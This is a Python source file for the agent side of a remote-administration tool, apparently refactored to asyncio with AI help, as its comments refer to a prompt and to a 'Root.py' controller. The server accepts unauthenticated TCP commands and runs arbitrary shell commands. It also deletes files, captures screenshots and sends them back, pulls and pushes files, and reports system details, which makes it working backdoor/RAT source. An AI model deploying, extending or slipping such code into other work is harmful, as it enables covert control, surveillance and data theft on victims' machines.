#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import os
import subprocess
import sys
import time
from datetime import datetime
import platform
# import wx # Removed wx
import mss # Added mss
import mss.tools # Added mss.tools
import asyncio # Added asyncio

# Refactored Execute function to be asynchronous
async def Execute(command):
	try:
		proc = await asyncio.create_subprocess_shell(
			command,
			stdout=asyncio.subprocess.PIPE,
			stderr=asyncio.subprocess.PIPE
		)
		stdout_bytes, stderr_bytes = await proc.communicate()

		if proc.returncode != 0 and stderr_bytes:
			# If there's a non-zero return code and stderr, prioritize stderr
			error_message = "Error executing command ({}): {}".format(proc.returncode, stderr_bytes.decode(errors='replace'))
			return error_message.encode() # Return as bytes
		elif stderr_bytes:
			# If there's stderr, even with return code 0, it might indicate an issue or warning
			# Depending on desired behavior, could combine with stdout or just return stderr
			# For now, let's treat significant stderr as an error to report
			error_message = "Command produced stderr: {}".format(stderr_bytes.decode(errors='replace'))
			# To be consistent with original, which merged stdout/stderr via `stderr=subprocess.STDOUT`
			# we should probably return stdout if it exists, or stderr if stdout is empty.
			# The original Popen with shell=True and stderr=STDOUT might behave differently than separate pipes.
			# Let's try to mimic: if stderr_bytes exist, return them (as error), else stdout.
			# For a more direct mimic of stderr=STDOUT, we'd concatenate, but that's usually for display.
			# For programmatic use, separating them is better.
			# The prompt asks: "If stderr is present, return an error message including the stderr content."
			# "Otherwise, return the stdout content."
			# This implies stderr takes precedence as an error indicator.
			return error_message.encode() # Return as bytes

		# If no significant stderr (or we decide stdout is primary return)
		return stdout_bytes # Return stdout as bytes

	except Exception as e:
		# Catch other potential errors during subprocess creation/communication
		error_message = "Failed to execute command: {}".format(str(e))
		return error_message.encode() # Return as bytes

async def handle_client(reader, writer):
	addr = writer.get_extra_info('peername')
	print('Connected by', addr)
	client_closed_normally = False
	try:
		while True:
			data_bytes = await reader.read(1024)
			if not data_bytes: # Connection closed by client
				print('Connection closed by client (EOF):', addr)
				client_closed_normally = True
				break

			data = data_bytes.decode().strip() # Ensure decoding and strip potential whitespace
			print(f"Received from {addr}: {data}")

			if not data: # Handle empty commands if necessary, or just continue
				continue

			if data[:7] == 'whereis':
				response = os.getcwd()
				writer.write(response.encode())
				await writer.drain()
			elif data[:3] == 'cd ':
				din = data.split(' ', 1)
				print(f"Changing directory to: {din[1]}")
				try:
					os.chdir(din[1])
					response = os.getcwd()
					writer.write(response.encode())
					await writer.drain()
				except OSError as e: # Changed from os.error to OSError for modern Python
					response = f'err+{str(e)}'
					writer.write(response.encode())
					await writer.drain()
			elif data[:3] == 'rem':
				path_parts = data.split(' ', 1)
				if len(path_parts) > 1:
					path_to_remove = path_parts[1]
					try:
						os.remove(path_to_remove)
						response = f'Removed: {path_to_remove}'
					except OSError as e:
						response = f'err+Failed to remove {path_to_remove}: {e}'
				else:
					response = 'err+No path specified for rem command'
				writer.write(response.encode())
				await writer.drain()
			elif data[:5] == 'rexit':
				print(f'Closed Connection with {addr}, waiting...')
				# No specific response needed before closing, client expects connection drop
				break
			elif data[:5] == 'close':
				print(f'Closing connection with: {addr}')
				# No specific response needed before closing
				break
			elif data[:5] == 'print':
				screenshot_filename = os.path.join(os.getcwd(), 'screenshot.png')
				try:
					with mss.mss() as sct:
						sct.shot(output=screenshot_filename)
					# Check if file was created, mss doesn't throw error but might not save if issues occur
					if not os.path.exists(screenshot_filename):
						# This specific exception might be too generic.
						# Consider a custom exception or more specific error handling if mss provides it.
						raise Exception("Screenshot file not created by mss.")

					writer.write(b'imgok')
					await writer.drain()

				except Exception as e:
					error_msg = f"Error taking screenshot: {str(e)}"
					print(error_msg) # Log error on slave side
					try:
						# Use writer (which is `writer` in this context)
						writer.write(f"error_screenshot:{error_msg}".encode())
						await writer.drain()
					except Exception as send_error:
						print(f"Failed to send screenshot error to root: {send_error}")
					# Removed 'return' here as per later refinement. If screenshot fails,
					# we don't proceed to the 'send' part, effectively stopping this command.
					# The client (Root.py) will not receive 'imgok' and should handle timeout or error.
					# If we `return`, the outer loop continues, which is fine.
					# The original prompt suggested `return`, let's stick to that.
					# If 'imgok' is not sent, the Root side print() command will not proceed to send 'send'.
					continue # Continue to the next command, effectively stopping this one.


				# File sending logic, adapted from original
				# ack_bytes should be received by reader, not writer.
				ack_bytes = await reader.read(1024) # reader is the correct object here
				if ack_bytes.decode().strip()[:4] == 'send':
					try:
						with open(screenshot_filename, 'rb') as f:
							while True:
								chunk = f.read(4096)
								if not chunk:
									break
								writer.write(chunk)
								await writer.drain()
						print('Sent print')
					except IOError as e:
						print(f"Error sending screenshot file: {e}")
						# If sending fails, we might want to inform the client, though current protocol doesn't explicitly.
					finally:
						if os.path.exists(screenshot_filename): # Check before removing
							os.remove(screenshot_filename) # Clean up the screenshot file
						# Original logic closed connection here.
						print(f"Closing connection with {addr} after screenshot send attempt.")
						break # Closing after screenshot send attempt
				else: # If 'send' not received
					if os.path.exists(screenshot_filename): # If 'send' not received, but screenshot was taken
						os.remove(screenshot_filename) # Clean up unused screenshot
			elif data[:8] == 'rootexit':
				print("Received rootexit command. Exiting server.")
				writer.close() # Try to close gracefully
				await writer.wait_closed()
				sys.exit(0) # This will stop the server and the script
			elif data[:8] == 'sendfile': # Client wants to send a file to server
				print('Waiting for file info...')
				writer.write('ready'.encode())
				await writer.drain()

				filepath_bytes = await reader.read(1024)
				filepath = filepath_bytes.decode().strip()
				print(f"Receiving file: {filepath}")
				try:
					with open(filepath, 'wb') as f:
						while True: # Loop to receive file chunks
							# This simple protocol assumes next data is file content
							# A more robust protocol would send size first or use delimiters
							chunk = await reader.read(4096) # Increased chunk size
							if not chunk: # Or a special end-of-file marker
								break
							# Check for an explicit EOF marker if protocol changes
							# For now, empty read means client closed or finished sending
							f.write(chunk)
							print(f"Received chunk for {filepath}")
					print(f'Received file {filepath} from {addr}')
					# No explicit break here in original logic, implies wait for next command
				except Exception as e: # General exception for file operations
					print(f"Error receiving file {filepath}: {e}")
					# Inform client? writer.write(f"err+Receiving {filepath} failed: {e}".encode())
					# await writer.drain()
				# break # Original code had a break here
			elif data[:8] == 'copyfile': # Client requests a file from server
				writer.write('ok'.encode())
				await writer.drain()

				filepath_to_send_bytes = await reader.read(1024)
				filepath_to_send = filepath_to_send_bytes.decode().strip()
				print(f"Attempting to send file: {filepath_to_send}")
				try:
					with open(filepath_to_send, 'rb') as f:
						while True:
							chunk = f.read(4096) # Increased chunk size
							if not chunk:
								break
							writer.write(chunk)
							await writer.drain()
							print(f"Sent chunk of {filepath_to_send}")
					print(f'Done sending {filepath_to_send} to {addr}.')
					# Original had time.sleep(1) and con.close()
					# Async equivalent of sleep: await asyncio.sleep(1)
					# Then close.
					await asyncio.sleep(1) # Replicating original behavior
					print(f"Closing connection with {addr} after copyfile.")
					break
				except FileNotFoundError:
					print(f"File not found: {filepath_to_send}")
					# Client isn't expecting an error message here based on original code.
					# Connection would just close after 'ok'.
					break
				except Exception as e:
					print(f"Error sending file {filepath_to_send}: {e}")
					break # Close connection on other errors
			elif data[:5] == 'uname':
				response = platform.uname()[1]+'?'+platform.uname()[0]+'?'+platform.uname()[2]+'?'+platform.uname()[3]+'?'+platform.uname()[4]
				writer.write(response.encode())
				await writer.drain()
			elif data[:6] == 'sysinf':
				if platform.system() == 'Linux':
					response_bytes = await Execute('sudo lscpu')
					writer.write(response_bytes)
					await writer.drain()
				elif platform.system() == 'Windows':
					response_bytes = await Execute('systeminfo')
					writer.write(response_bytes)
					await writer.drain()
			else: # Default: execute arbitrary command
				print(f"Executing command for {addr}: {data}")
				response_bytes = await Execute(data)
				writer.write(response_bytes)
				await writer.drain()
				print(f'Executed command for {addr}, sent response.')
				# Original had a break here, implying one command per connection in this else block.
				# This seems unlikely to be the intended general case, usually a shell stays open.
				# Removing the break to allow multiple commands per session.
				# If the client expects a close, it should send 'rexit' or 'close'.

	except asyncio.IncompleteReadError:
		print(f"Client {addr} closed connection unexpectedly (incomplete read).")
	except ConnectionResetError:
		print(f"Connection reset by peer: {addr}")
	except Exception as e:
		print(f"An error occurred with client {addr}: {e}")
	finally:
		if not client_closed_normally: # Log if not already logged as EOF
			print(f"Closing connection for {addr}")
		writer.close()
		await writer.wait_closed()
		print(f"Connection with {addr} fully closed.")

async def async_main():
	server = await asyncio.start_server(
		handle_client, '127.0.0.1', 1255)

	addr = server.sockets[0].getsockname()
	print(f'Serving on {addr}')

	async with server:
		await server.serve_forever()

if __name__ == '__main__':
	try:
		asyncio.run(async_main())
	except KeyboardInterrupt:
		print('Server shutting down (KeyboardInterrupt)...')
	except Exception as e: # Catch other exceptions during startup/shutdown
		print(f"Critical error: {e}")

